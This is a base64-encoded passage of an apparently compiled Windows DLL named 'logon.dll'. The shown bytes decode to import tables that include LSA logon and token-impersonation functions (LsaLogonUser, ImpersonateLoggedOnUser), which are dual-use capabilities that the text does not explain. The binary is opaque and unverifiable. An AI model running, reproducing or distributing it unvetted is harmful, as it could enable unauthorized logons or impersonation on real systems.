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AAAAAAAilAQAAAAAAGqUBAAAAAAAkpQEAAAAAADClAQAAAAAAPKUBAAAAAABKpQEAAAAAAFqlAQAAAAAAaqUBAAAAAAB8pQEAAAAAAJClAQAAAAAApqUBAAAAAAAAAAAAAAAAAICgAQAAAAAAXqABAAAAAABIoAEAAAAAAAAAAAAAAAAAJgBMc2FDb25uZWN0VW50cnVzdGVkACwATHNhTG9va3VwQXV0aGVudGljYXRpb25QYWNrYWdlAAArAExzYUxvZ29uVXNlcgAAU2VjdXIzMi5kbGwAwgBDcmVhdGVGaWxlVwBTBFJlYWRGaWxlAAAPAkdldEN1cnJlbnRQcm9jZXNzAFYCR2V0TGFzdEVycm9yAADRAENyZWF0ZU11dGV4VwAAXwVTbGVlcAAdBmxzdHJsZW5XAADvBVdyaXRlRmlsZQBLRVJORUwzMi5kbGwAANMBTHNhTnRTdGF0dXNUb1dpbkVycm9yABICT3BlblByb2Nlc3NUb2tlbgAAbwFHZXRUb2tlbkluZm9ybWF0aW9uAIkBSW1wZXJzb25hdGVMb2dnZWRPblVzZXIAQURWQVBJMzIuZGxsAAAlAUVuY29kZVBvaW50ZXIA/wBEZWNvZGVQb2ludGVyAM4BR2V0Q29tbWFuZExpbmVBABQCR2V0Q3VycmVudFRocmVhZElkAAC2BFJ0bFBjVG9GaWxlSGVhZGVyAEMEUmFpc2VFeGNlcHRpb24AALQEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAugRSdGxVbndpbmRFeABqA0lzRGVidWdnZXJQcmVzZW50AHADSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABXAUV4aXRQcm9jZXNzAGwCR2V0TW9kdWxlSGFuZGxlRXhXAACkAkdldFByb2NBZGRyZXNzAADUA011bHRpQnl0ZVRvV2lkZUNoYXIA2wVXaWRlQ2hhclRvTXVsdGlCeXRlAEEDSGVhcFNpemUAADwDSGVhcEZyZWUAADgDSGVhcEFsbG9jABgFU2V0TGFzdEVycm9yAACpAkdldFByb2Nlc3NIZWFwAADHAkdldFN0ZEhhbmRsZQAARQJHZXRGaWxlVHlwZQAGAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgDFAkdldFN0YXJ0dXBJbmZvVwBoAkdldE1vZHVsZUZpbGVOYW1lQQAAMARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAQAkdldEN1cnJlbnRQcm9jZXNzSWQA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQAuAkdldEVudmlyb25tZW50U3RyaW5nc1cAAKMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cArQRSdGxDYXB0dXJlQ29udGV4dAC7BFJ0bFZpcnR1YWxVbndpbmQAAJAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABQBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBRA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAbgVUZXJtaW5hdGVQcm9jZXNzAACABVRsc0FsbG9jAACCBVRsc0dldFZhbHVlAIMFVGxzU2V0VmFsdWUAgQVUbHNGcmVlAG0CR2V0TW9kdWxlSGFuZGxlVwAAKQFFbnRlckNyaXRpY2FsU2VjdGlvbgAApQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAaQJHZXRNb2R1bGVGaWxlTmFtZVcAAKoDTG9hZExpYnJhcnlFeFcAAHUDSXNWYWxpZENvZGVQYWdlAKoBR2V0QUNQAACNAkdldE9FTUNQAAC5AUdldENQSW5mbwA/A0hlYXBSZUFsbG9jAJkDTENNYXBTdHJpbmdXAADiAUdldENvbnNvbGVDUAAA9AFHZXRDb25zb2xlTW9kZQAACwVTZXRGaWxlUG9pbnRlckV4AAD9A091dHB1dERlYnVnU3RyaW5nVwAAzAJHZXRTdHJpbmdUeXBlVwAALgVTZXRTdGRIYW5kbGUAAO4FV3JpdGVDb25zb2xlVwCYAUZsdXNoRmlsZUJ1ZmZlcnMAAH8AQ2xvc2VIYW5kbGUAAAAAAAAAdZgAAHOYAAAyot8tmSsAAM1dINJm1P//AQAAAAIAAAACAAAAAQAAAAAAAAAAAAAA6CgBgAEAAADwKAGAAQAAAAEAAAAWAAAAAgAAAAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAAAAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEgAAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAAADQAAAFcAAAAWAAAAWQAAAAsAAABsAAAADQAAAG0AAAAgAAAAcAAAABwAAAByAAAACQAAAAYAAAAWAAAAgAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAAAAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAAAYBwAADAAAAAwAAAAIAAAA/////wAAAAAAAAAAAAAAAP//////////gAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAEDFAIABAAAAQMUAgAEAAABAxQCAAQAAAEDFAIABAAAAQMUAgAEAAABAxQCAAQAAAEDFAIABAAAAQMUAgAEAAABAxQCAAQAAAEDFAIABAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AIG0BgAEAAAAXAAAAAAAAAChtAYABAAAAIgAAAAAAAAAwbQGAAQAAACMAAAAAAAAANG0BgAEAAAAkAAAAAAAAADhtAYABAAAAJQAAAAAAAAA8bQGAAQAAACYAAAAAAAAASG0BgAEAAACUJgAAAAAAAAAAAAAAAAAAIN0BgAEAAAAAAAAAAAAAACDdAYABAAAAAQEAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAEMAAAAAAAAAAAAAABx3AYABAAAAIHcBgAEAAAAkdwGAAQAAACh3AYABAAAALHcBgAEAAAAwdwGAAQAAADR3AYABAAAAOHcBgAEAAABAdwGAAQAAAEh3AYABAAAAUHcBgAEAAABgdwGAAQAAAGx3AYABAAAAeHcBgAEAAACEdwGAAQAAAIh3AYABAAAAjHcBgAEAAACQdwGAAQAAAJR3AYABAAAAmHcBgAEAAACcdwGAAQAAAKB3AYABAAAApHcBgAEAAACodwGAAQAAAKx3AYABAAAAsHcBgAEAAAC4dwGAAQAAAMB3AYABAAAAzHcBgAEAAADUdwGAAQAAAJR3AYABAAAA3HcBgAEAAADkdwGAAQAAAOx3AYABAAAA+HcBgAEAAAAIeAGAAQAAABB4AYABAAAAIHgBgAEAAAAseAGAAQAAADB4AYABAAAAOHgBgAEAAABIeAGAAQAAAGB4AYABAAAAAQAAAAAAAABweAGAAQAAAHh4AYABAAAAgHgBgAEAAACIeAGAAQAAAJB4AYABAAAAmHgBgAEAAACgeAGAAQAAAKh4AYABAAAAuHgBgAEAAADIeAGAAQAAANh4AYABAAAA8HgBgAEAAAAIeQGAAQAAABh5AYABAAAAMHkBgAEAAAA4eQGAAQAAAEB5AYABAAAASHkBgAEAAABQeQGAAQAAAFh5AYABAAAAYHkBgAEAAABoeQGAAQAAAHB5AYABAAAAeHkBgAEAAACAeQGAAQAAAIh5AYABAAAAkHkBgAEAAACgeQGAAQAAALh5AYABAAAAyHkBgAEAAABQeQGAAQAAANh5AYABAAAA6HkBgAEAAAD4eQGAAQAAAAh6AYABAAAAIHoBgAEAAAAwegGAAQAAAEh6AYABAAAAXHoBgAEAAABkegGAAQAAAHB6AYABAAAAiHoBgAEAAACwegGAAQAAAIBYAYABAAAAcMIBgAEAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlL8BgAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACUvwGAAQAAAA